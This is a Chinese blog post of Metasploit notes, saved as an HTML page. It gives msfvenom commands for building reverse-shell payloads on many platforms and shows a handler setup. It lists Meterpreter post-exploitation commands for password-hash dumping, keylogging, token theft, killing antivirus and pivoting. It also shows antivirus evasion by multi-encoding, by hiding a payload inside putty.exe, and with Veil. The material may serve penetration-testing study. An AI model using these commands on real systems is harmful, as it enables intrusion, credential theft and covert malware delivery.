@@ -1,0 +1,1128 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+<style>
+    .pace .pace-progress {
+        background: #1E92FB; /*进度条颜色*/
+        height: 3px;
+    }
+    .pace .pace-progress-inner {
+         box-shadow: 0 0 10px #1E92FB, 0 0 5px     #1E92FB; /*阴影颜色*/
+    }
+    .pace .pace-activity {
+        border-top-color: #1E92FB;    /*上边框颜色*/
+        border-left-color: #1E92FB;    /*左边框颜色*/
+    }
+</style>
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Metasploit,渗透测试," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Hello_C技术博客" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico?v=5.1.1" />
+
+
+
+
+
+
+<meta name="description" content="Metasploit就是一个漏洞框架。它的全称叫做The Metasploit Framework，简称叫做MSF。Metasploit作为全球最受欢迎的工具，不仅仅是因为它的方便性和强大性，更重要的是它的框架。它允许使用者开发自己的漏洞脚本，从而进行测试。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Metasploit笔记">
+<meta property="og:url" content="http://yoursite.com/渗透/2018/05/10/Metasploit笔记.html">
+<meta property="og:site_name" content="Hello_C技术博客">
+<meta property="og:description" content="Metasploit就是一个漏洞框架。它的全称叫做The Metasploit Framework，简称叫做MSF。Metasploit作为全球最受欢迎的工具，不仅仅是因为它的方便性和强大性，更重要的是它的框架。它允许使用者开发自己的漏洞脚本，从而进行测试。">
+<meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/18-5-10/88801847.jpg">
+<meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/18-5-10/25903092.jpg">
+<meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/18-5-10/16142225.jpg">
+<meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/18-5-10/7100989.jpg">
+<meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/18-5-10/3673834.jpg">
+<meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/18-5-10/4263366.jpg">
+<meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/18-5-10/25659408.jpg">
+<meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/18-5-10/19801339.jpg">
+<meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/18-5-10/74346896.jpg">
+<meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/18-5-10/59067905.jpg">
+<meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/18-5-10/73284084.jpg">
+<meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/18-5-10/61888035.jpg">
+<meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/18-5-10/24950190.jpg">
+<meta property="og:updated_time" content="2018-05-10T10:18:21.206Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Metasploit笔记">
+<meta name="twitter:description" content="Metasploit就是一个漏洞框架。它的全称叫做The Metasploit Framework，简称叫做MSF。Metasploit作为全球最受欢迎的工具，不仅仅是因为它的方便性和强大性，更重要的是它的框架。它允许使用者开发自己的漏洞脚本，从而进行测试。">
+<meta name="twitter:image" content="http://obh1qcqek.bkt.clouddn.com/18-5-10/88801847.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 'undefined',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/渗透/2018/05/10/Metasploit笔记.html"/>
+
+
+
+
+
+  <title>Metasploit笔记 | Hello_C技术博客</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <div style="display: none;">
+    <script src="//s95.cnzz.com/z_stat.php?id=1261655448&web_id=1261655448" language="JavaScript"></script>
+  </div>
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hello_C技术博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">一个小白的独白！</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/渗透/2018/05/10/Metasploit笔记.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Hello_C">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello_C技术博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Metasploit笔记</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-10T17:49:38+08:00">
+                2018-05-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/渗透/2018/05/10/Metasploit笔记.html#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="渗透/2018/05/10/Metasploit笔记.html" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/渗透/2018/05/10/Metasploit笔记.html" class="leancloud_visitors" data-flag-title="Metasploit笔记">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">热度 </span>
+               
+                 <span class="leancloud-visitors-count">℃</span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计</span>
+                
+                <span title="字数统计">
+                  1,678
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  8
+                </span>
+              
+            </div>
+          
+
+          
+          
+		  
+         
+                <span id="busuanzi_container_page_pv">  |  热度<span id="busuanzi_value_page_pv"></span>℃</span>
+         
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>　　Metasploit就是一个漏洞框架。它的全称叫做The Metasploit Framework，简称叫做MSF。Metasploit作为全球最受欢迎的工具，不仅仅是因为它的方便性和强大性，更重要的是它的框架。它允许使用者开发自己的漏洞脚本，从而进行测试。<br><a id="more"></a></p>
+<h2 id="0x01-基本操作"><a href="#0x01-基本操作" class="headerlink" title="0x01 基本操作"></a>0x01 基本操作</h2><h3 id="1、运行"><a href="#1、运行" class="headerlink" title="1、运行"></a>1、运行</h3><p>　　Shell中直接输入msfconsole<br><img src="http://obh1qcqek.bkt.clouddn.com/18-5-10/88801847.jpg" alt=""></p>
+<h3 id="2、建立搜索缓存（数据库）"><a href="#2、建立搜索缓存（数据库）" class="headerlink" title="2、建立搜索缓存（数据库）"></a>2、建立搜索缓存（数据库）</h3><p>启动PostgreSQL数据库服务 ：service postgresql start 监听5432端口<br>初始化Metasploit数据库 ：msfdb init<br>查看数据库联接情况 ：msfconsole    db_status<br>建立数据库缓存 ：msfconsole    db_rebuild_cache</p>
+<h3 id="3、专业术语"><a href="#3、专业术语" class="headerlink" title="3、专业术语"></a>3、专业术语</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">– Exploit，攻击工具/代码 </div><div class="line">– Payload，攻击载荷 </div><div class="line">– Shellcode </div><div class="line">– Module，模块 </div><div class="line">– Listener，监听器</div></pre></td></tr></table></figure>
+<h3 id="4、Metasploit主目录"><a href="#4、Metasploit主目录" class="headerlink" title="4、Metasploit主目录"></a>4、Metasploit主目录</h3><p>Kali Linux /usr/share/metasploit-framework</p>
+<h3 id="5、常用命令"><a href="#5、常用命令" class="headerlink" title="5、常用命令"></a>5、常用命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">show exploits – 查看所有可用的渗透攻击程序代码 </div><div class="line">show auxiliary – 查看所有可用的辅助攻击工具 </div><div class="line">show options – 查看该模块所有可用选项 </div><div class="line">show payloads – 查看该模块适用的所有载荷代码 </div><div class="line">show targets – 查看该模块适用的攻击目标类型</div><div class="line">search – 根据关键字搜索某模块 </div><div class="line">info – 显示某模块的详细信息 </div><div class="line">use – 进入使用某渗透攻击模块 </div><div class="line">back – 回退 </div><div class="line">set/unset – 设置/禁用模块中的某个参数 </div><div class="line">setg/unsetg – 设置/禁用适用于所有模块的全局参数 </div><div class="line">save – 将当前设置值保存下来，以便下次启动MSF终端时仍可使用</div></pre></td></tr></table></figure>
+<h2 id="0x02-Metasploit功能程序"><a href="#0x02-Metasploit功能程序" class="headerlink" title="0x02 Metasploit功能程序"></a>0x02 Metasploit功能程序</h2><p><strong>msfvenom</strong> （攻击载荷生成和编码器）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">主要参数：</div><div class="line">-p payload</div><div class="line">-e 编码方式</div><div class="line">-i 编码次数</div><div class="line">-b 在生成的程序中避免出现的值</div><div class="line">LHOST,LPORT 监听上线的主机IP和端口</div><div class="line">-f exe 生成EXE格式</div><div class="line"></div><div class="line">使用msfvenom -l 可以查看可以利用payload</div><div class="line">msfvenom -l | grep windows | grep x64 | grep tcp  选择payload</div></pre></td></tr></table></figure></p>
+<h3 id="1、生成可执行文件"><a href="#1、生成可执行文件" class="headerlink" title="1、生成可执行文件"></a>1、生成可执行文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">Linux:</div><div class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</div><div class="line">Windows:</div><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</div><div class="line">Mac:</div><div class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</div><div class="line">PHP:</div><div class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</div><div class="line">cat shell.php | pbcopy &amp;&amp; echo &apos;&lt;?php &apos; | tr -d &apos;\n&apos; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</div><div class="line">ASP:</div><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</div><div class="line">JSP:</div><div class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</div><div class="line">WAR:</div><div class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</div><div class="line">Python:</div><div class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</div><div class="line">Bash:</div><div class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</div><div class="line">Perl:</div><div class="line">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</div></pre></td></tr></table></figure>
+<h3 id="2、监听"><a href="#2、监听" class="headerlink" title="2、监听"></a>2、监听</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">set PAYLOAD &lt;Payload name&gt;</div><div class="line">set LHOST &lt;LHOST value&gt;</div><div class="line">set LPORT &lt;LPORT value&gt;</div><div class="line">set ExitOnSession false   让connection保持连接(即使一个连接退出,仍然保持listening状态)</div><div class="line">exploit -j –z  -j(作为job开始运行)和-z(不立即进行session交换--也即是自动后台运行)</div></pre></td></tr></table></figure>
+<h3 id="3、实例"><a href="#3、实例" class="headerlink" title="3、实例"></a>3、实例</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b ‘\x00’ LHOST=172.16.0.4 LPORT=443 -f exe &gt; abc.exe</div></pre></td></tr></table></figure>
+<p><img src="http://obh1qcqek.bkt.clouddn.com/18-5-10/25903092.jpg" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">msf &gt; use exploit/multi/handler</div><div class="line">msf exploit(handler) &gt; set payload windows/x64/meterpreter/reverse_tcp</div><div class="line">msf exploit(handler) &gt; show options</div></pre></td></tr></table></figure></p>
+<p><img src="http://obh1qcqek.bkt.clouddn.com/18-5-10/16142225.jpg" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">msf exploit(handler) &gt; set LHOST 172.16.0.4</div><div class="line">msf exploit(handler) &gt; set ExitOnSession false</div><div class="line">msf exploit(handler) &gt; exploit -j -z  </div><div class="line">-j(计划任务下进行攻击，后台) -z(攻击完成不遇会话交互)</div><div class="line">msf exploit(handler) &gt; jobs  查看后台攻击任务 </div><div class="line">msf exploit(handler) &gt; kill &lt;id&gt;  停止某后台攻击任务 </div><div class="line">msf exploit(handler) &gt; sessions -l  (查看会话)</div></pre></td></tr></table></figure></p>
+<p><img src="http://obh1qcqek.bkt.clouddn.com/18-5-10/7100989.jpg" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">msf exploit(handler) &gt; sessions -i 2   选择会话</div><div class="line">msf exploit(handler) &gt; sessions -k 2   结束会话</div></pre></td></tr></table></figure></p>
+<p><img src="http://obh1qcqek.bkt.clouddn.com/18-5-10/3673834.jpg" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Ctrl+z  把会话放到后台</div><div class="line">Ctrl+c  结束会话</div></pre></td></tr></table></figure></p>
+<h2 id="0x03-Meterpreter后攻击"><a href="#0x03-Meterpreter后攻击" class="headerlink" title="0x03 Meterpreter后攻击"></a>0x03 Meterpreter后攻击</h2><p>　　Meterpreter提供的功能包括反追踪、纯内存工作模式、系统 信息获取、密码哈希导出、文件上传下载、屏幕截取、键盘记 录、权限提升、跳板攻击等等。<br><strong>常用命令：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; background  放回后台</div><div class="line">meterpreter &gt; exit  关闭会话</div><div class="line">meterpreter &gt; help  帮助信息</div><div class="line">meterpreter &gt; Sysinfo    系统平台信息</div><div class="line">meterpreter &gt; screenshot  屏幕截取</div><div class="line">meterpreter &gt; shell  命令行shell (exit退出)</div><div class="line">meterpreter &gt; getlwd  查看本地目录</div><div class="line">meterpreter &gt; lcd  切换本地目录</div><div class="line">meterpreter &gt; getwd  查看目录</div><div class="line">meterpreter &gt; ls 查看文件目录列表</div><div class="line">meterpreter &gt; cd  切换目录 </div><div class="line">meterpreter &gt; rm  删除文件 </div><div class="line">meterpreter &gt; download C:\\Users\\123\\Desktop\\1.txt 1.txt 下载文件</div><div class="line">meterpreter &gt; upload /var/www/wce.exe wce.exe  上传文件</div><div class="line">meterpreter &gt; search -d c:  -f *.doc  搜索文件</div><div class="line">meterpreter &gt; execute -f  cmd.exe -i   执行程序/命令 </div><div class="line">meterpreter &gt; ps  查看进程</div><div class="line">meterpreter &gt; run post/windows/capture/keylog_recorder   键盘记录</div><div class="line">meterpreter &gt; getuid  查看当前用户权限</div><div class="line">meterpreter &gt; use priv  加载特权模块</div><div class="line">meterpreter &gt; getsystem  提升到SYSTEM权限</div><div class="line">meterpreter &gt; hashdump  导出密码散列</div><div class="line">meterpreter &gt; ps   查看高权限用户PID</div><div class="line">meterpreter &gt; steal_token &lt;PID&gt;  窃取令牌</div><div class="line">meterpreter &gt; rev2self  恢复原来的令牌 </div><div class="line">meterpreter &gt; migrate pid  迁移进程</div><div class="line">meterpreter &gt; run killav  关闭杀毒软件 </div><div class="line">meterpreter &gt; run getgui-e  启用远程桌面</div><div class="line">meterpreter &gt; portfwd add -l 1234 -p 3389 -r &lt;目标IP&gt;  端口转发</div><div class="line">meterpreter &gt; run get_local_subnets  获取内网网段信息</div><div class="line">meterpreter &gt; run autoroute -s &lt;内网网段&gt;  创建自动路由</div><div class="line">meterpreter &gt; run autoroute -p  查看自动路由表</div><div class="line"></div><div class="line">创建代理通道:</div><div class="line">msf &gt; use auxiliary/server/socks4a   设置socks4代理模块</div><div class="line">msf auxiliary(socks4a) &gt; show options </div><div class="line">msf auxiliary(socks4a) &gt; run</div><div class="line">配置proxychains参数：</div><div class="line">nano /etc/proxychains.conf   修改代理监听端口,和前面端口一致</div><div class="line">quite_mode  设置成安静模式：去掉如下参数前面的注释</div></pre></td></tr></table></figure></p>
+<h2 id="0x04-免杀"><a href="#0x04-免杀" class="headerlink" title="0x04 免杀"></a>0x04 免杀</h2><h3 id="1、多次编码免杀"><a href="#1、多次编码免杀" class="headerlink" title="1、多次编码免杀"></a>1、多次编码免杀</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.80.12 LPORT=443 -e x86/shikata_ga_nai-i5 -f exe -o /var/www/html/reverse_http_encode.exe</div></pre></td></tr></table></figure>
+<h3 id="2、自定义二进制代码的文件模板免杀"><a href="#2、自定义二进制代码的文件模板免杀" class="headerlink" title="2、自定义二进制代码的文件模板免杀"></a>2、自定义二进制代码的文件模板免杀</h3><p>　　使用“putty.exe”作为文件模板，而且随着putty程序运行而隐蔽同时运行，还使用编码器进行了编码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.80.12 LPORT=443 -e x86/shikata_ga_nai-i5 -x ~/putty.exe -k -f exe -o /var/www/html/reverse_http_putty.exe</div></pre></td></tr></table></figure></p>
+<h3 id="3、使用Veil生成免杀代码"><a href="#3、使用Veil生成免杀代码" class="headerlink" title="3、使用Veil生成免杀代码"></a>3、使用Veil生成免杀代码</h3><p>下载地址：<br><a href="https://github.com/Veil-Framework/Veil-Evasion" target="_blank" rel="external">https://github.com/Veil-Framework/Veil-Evasion</a> (只集合了Evasion)<br><a href="https://github.com/Veil-Framework/Veil" target="_blank" rel="external">https://github.com/Veil-Framework/Veil</a><br>安装：（建议使用git下载，否则无法更新）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">apt-get -y install git</div><div class="line">git clone https://github.com/Veil-Framework/Veil.git</div><div class="line">cd Veil/</div><div class="line">cd setup</div><div class="line">sudo ./setup.sh -c</div></pre></td></tr></table></figure></p>
+<p><img src="http://obh1qcqek.bkt.clouddn.com/18-5-10/4263366.jpg" alt=""><br>　　一路回车就行，可能中间或出现让你安装python、ruby、go语言等，默认安装就行<br><img src="http://obh1qcqek.bkt.clouddn.com/18-5-10/25659408.jpg" alt=""><br>运行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cd ~/Veil </div><div class="line">./Veil.py</div></pre></td></tr></table></figure></p>
+<p><img src="http://obh1qcqek.bkt.clouddn.com/18-5-10/19801339.jpg" alt=""><br>使用Veil-Evasion工具：<br>use Evasion<br><img src="http://obh1qcqek.bkt.clouddn.com/18-5-10/74346896.jpg" alt=""><br>列举所有模块：<br>list<br><img src="http://obh1qcqek.bkt.clouddn.com/18-5-10/59067905.jpg" alt=""><br>使用某个模块：<br>use <name><br>use c/meterpreter/rev_http.py<br><img src="http://obh1qcqek.bkt.clouddn.com/18-5-10/73284084.jpg" alt=""><br>设置变量:<br>set<br><img src="http://obh1qcqek.bkt.clouddn.com/18-5-10/61888035.jpg" alt=""><br>生成可执行代码:<br>generate<br><img src="http://obh1qcqek.bkt.clouddn.com/18-5-10/24950190.jpg" alt=""><br>　　接着就是加载msf监听模块，等待用户的上线了。</name></p>
+<p>　　msf功能还是十分强大的，是渗透必备神器，可以自定义渗透脚本，更新速度也挺快，这里只是简单记录了他的用法，还有更大的能力等待着各位去开发和挖掘，这个笔记也会在后期慢慢更新，增加新的技能，未完待续。。。</p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+  <ul class="post-copyright">
+    <li class="post-copyright-author">
+      <strong>本文作者：</strong>
+      Hello_C
+    </li>
+    <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="http://yoursite.com/渗透/2018/05/10/Metasploit笔记.html" title="Metasploit笔记">http://yoursite.com/渗透/2018/05/10/Metasploit笔记.html</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong>
+      本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Metasploit/" rel="tag"><i class="fa fa-tag"></i>  Metasploit</a>
+          
+            <a href="/tags/渗透测试/" rel="tag"><i class="fa fa-tag"></i>  渗透测试</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/CTF/2018/01/14/上传绕过WAF的tips大全.html" rel="next" title="上传绕过WAF的tips大全">
+                <i class="fa fa-chevron-left"></i> 上传绕过WAF的tips大全
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        <!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+  <a class="jiathis_button_tsina"></a>
+  <a class="jiathis_button_tqq"></a>
+  <a class="jiathis_button_weixin"></a>
+  <a class="jiathis_button_cqq"></a>
+  <a class="jiathis_button_douban"></a>
+  <a class="jiathis_button_renren"></a>
+  <a class="jiathis_button_qzone"></a>
+  <a class="jiathis_button_kaixin001"></a>
+  <a class="jiathis_button_copy"></a>
+  <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+  <a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript" >
+  var jiathis_config={
+    hideMore:false
+  }
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
